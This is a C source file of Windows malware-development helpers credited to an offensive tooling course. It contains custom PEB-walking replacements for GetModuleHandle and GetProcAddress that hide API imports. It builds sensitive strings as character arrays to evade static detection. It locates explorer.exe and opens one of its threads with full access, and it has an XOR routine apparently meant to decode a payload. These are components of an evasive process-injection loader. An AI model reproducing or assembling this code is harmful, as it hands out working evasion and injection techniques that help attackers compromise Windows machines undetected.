
#include "structsFunc.h"
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include "funcCall.h"

//#include <wincrypt.h>

//taken from sektor7 malware intermediate course: https://institute.sektor7.net/rto-maldev-intermediate
//explanation here: https://ph3n1x.com/posts/parse-ntdll-and-peb/
//or you can use this one from ParanoidNinja: https://github.com/paranoidninja/PIC-Get-Privileges/blob/main/addresshunter.h
HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName) {

	// get the offset of Process Environment Block
#ifdef _M_IX86 
	PEB * ProcEnvBlk = (PEB *) __readfsdword(0x30);
#else
	PEB * ProcEnvBlk = (PEB *)__readgsqword(0x60);
#endif

	// return base address of a calling module
	if (sModuleName == NULL) 
		return (HMODULE) (ProcEnvBlk->ImageBaseAddress);

	PEB_LDR_DATA * Ldr = ProcEnvBlk->Ldr;
	LIST_ENTRY * ModuleList = NULL;
	
	ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY *  pStartListEntry = ModuleList->Flink;

	for (LIST_ENTRY *  pListEntry  = pStartListEntry;  		// start from beginning of InMemoryOrderModuleList
					   pListEntry != ModuleList;	    	// walk all list entries
					   pListEntry  = pListEntry->Flink)	{
		
		// get current Data Table Entry
		LDR_DATA_TABLE_ENTRY * pEntry = (LDR_DATA_TABLE_ENTRY *) ((BYTE *) pListEntry - sizeof(LIST_ENTRY));

		// check if module is found and return its base address
		if (strcmp((const char *) pEntry->BaseDllName.Buffer, (const char *) sModuleName) == 0)
			return (HMODULE) pEntry->DllBase;
	}

	// otherwise:
	return NULL;

}

FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char * sProcName) {

	char * pBaseAddr = (char *) hMod;

	// get pointers to main headers/structures
	IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pBaseAddr;
	IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY * pExportDataDir = (IMAGE_DATA_DIRECTORY *) (&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY * pExportDirAddr = (IMAGE_EXPORT_DIRECTORY *) (pBaseAddr + pExportDataDir->VirtualAddress);

	// resolve addresses to Export Address Table, table of function names and "table of ordinals"
	DWORD * pEAT = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD * pFuncNameTbl = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD * pHintsTbl = (WORD *) (pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);

	// function address we're looking for
	void *pProcAddr = NULL;

	
	// resolve function by name
	
		// parse through table of function names
		for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
			char * sTmpFuncName = (char *) pBaseAddr + (DWORD_PTR) pFuncNameTbl[i];
	
			if (strcmp(sProcName, sTmpFuncName) == 0)	{
				// found, get the function virtual address = RVA + BaseAddr
				pProcAddr = (FARPROC) (pBaseAddr + (DWORD_PTR) pEAT[pHintsTbl[i]]);
				break;
			}
		}
	

	return (FARPROC) pProcAddr;
}

int FindTarget()
{
	WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };
	WCHAR procName[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
	char qu3rySyst3m[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n',0 };
	//NTSTATUS success;
	ULONG ProcId = 0;
	myNtQuerySystemInformation penumProc = (myNtQuerySystemInformation)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), qu3rySyst3m);

	// allocate large-enough buffer
	ULONG size = 1 << 18;
	void* buffer = nullptr;

	for (;;) {
		buffer = realloc(buffer, size);
		if (!buffer)
			return 1;

		ULONG needed;
		NTSTATUS status = penumProc(SystemExtendedProcessInformation, buffer, size, &needed);
		if (status == 0)	// success
			break;

		if (status == 0xC0000004) {
			size = needed + (1 << 12);
			continue;
		}
		// some other error
		return status;
	}

	auto p = (SYSTEM_PROCESS_INFORMATION*)buffer;
	for (;;) {

		if (!lstrcmpiW(p->ImageName.Buffer, procName)) {

			ProcId = HandleToULong(p->UniqueProcessId);
			break;
		}
		/*
		printf("PID: %6u PPID: %6u, Session: %u, Threads: %3u %ws\n",
			HandleToULong(p->UniqueProcessId),
			HandleToULong(p->InheritedFromUniqueProcessId),
			p->SessionId, p->NumberOfThreads,
			p->ImageName.Buffer ? p->ImageName.Buffer : L"");
		*/
		if (p->NextEntryOffset == 0)	// enumeration end
			break;

		p = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)p + p->NextEntryOffset);
	}
	free(buffer);

	return ProcId;
}

HANDLE FindThread(int pid) {

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) {
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);

	return hThread;
}

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len-1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}